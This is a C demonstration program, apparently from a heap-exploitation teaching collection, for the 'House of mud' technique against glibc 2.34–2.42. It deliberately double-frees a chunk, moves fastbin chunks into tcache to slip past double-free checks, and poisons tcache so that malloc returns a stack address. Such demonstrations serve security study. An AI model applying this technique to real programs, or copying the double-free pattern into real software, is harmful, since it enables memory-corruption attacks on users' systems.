#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <stdint.h>
/*
Tested on GLIBC 2.34 to 2.42 (x86_64)

House of mud is similar to house of botcake, also aiming to bypass the restriction introduced in 
https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d

We make use of fastbin reversal into the tcache to bypass double free protections, and allocate
a chunk at an arbitrary address that is 0x10 aligned.

This attack assumes heap leak is available in libc >=2.32, in order to bypass pointer mangling in tcache.

Technique by @fern89
*/
int main(){
    // disable _IO_FILE buffering so it wont interfere
    setvbuf(stdout, NULL, _IONBF, 0);
    
    printf("This technique uses fastbin reversal into tcache to bypass double free restrictions,\n");
    printf("allowing malloc to return an arbitrary location, in this case the stack. This attack\n");
    printf("only requires a double free, and works with allocations of solely one size.\n");
    printf("Heap leak is required in glibc >=2.32.\n\n");
    
    // setup
    uint64_t stack_var[4] __attribute__ ((aligned (0x10)));
    printf("The target address we want malloc to return is: %p\n\n", stack_var);
    
    // prepare heap layout
    printf("Preparing heap layout, allocating 7 chunks (malloc(0x30)) to fill up tcache later.\n");
    uint64_t* chunks[9];
    for(int i=0;i<7;i++) chunks[i] = malloc(0x30);
    printf("Allocating 2 chunks to place in fastbin.\n");
    uint64_t* a = malloc(0x30);
    uint64_t* b = malloc(0x30);
    printf("a @ %p\n", a);
    printf("b @ %p\n\n", b);
    
    // fill tcache
    printf("Freeing 7 chunks to fill tcache.\n\n");
    for(int i=0;i<7;i++) free(chunks[i]);
    
    // trigger vuln
    printf("Now tcache is full, we go to fastbin.\n");
    printf("Perform fastbin dup. a @ %p is freed twice.\n\n", a);
    free(a);
    free(b);
    /*VULNERABILITY*/
    free(a); // a has already been freed
    /*VULNERABILITY*/
    printf("Now fastbin has a->b->a\n\n");
    
    // reverse fastbin into tcache
    printf("Clearing tcache.\n");
    for(int i=0;i<7;i++) malloc(0x30);
    printf("Now, we allocate another chunk. This will pull from the fastbin, and cause all the fastbin chunks to be transferred to tcache!\n");
    printf("See https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3861 for more info.\n");
    printf("Note that double free protection within tcache is NOT activated during this!\n");
    a = malloc(0x30);
    printf("We alloc a @ %p. Now tcache has b->a->b, with count = 3.\n\n", a);
    
    // poison tcache
    printf("Performing tcache poisoning, use allocated a to control fd of a in tcache.\n");
    uint64_t ptr = (uint64_t)stack_var;
    uint64_t addr = (uint64_t)a;
    a[0] = (addr >> 12) ^ ptr;
    printf("Retrieve b @ %p from tcache\n", malloc(0x30));
    printf("Retrieve a @ %p. Now our target chunk should be at tcache top.\n\n", malloc(0x30));
    
    // retrieve target chunk
    uint64_t* target = malloc(0x30);
    assert((uint64_t) stack_var == (uint64_t) target);
    printf("We got the control!\ntarget @ %p == stack_var @ %p\n", target, stack_var);
}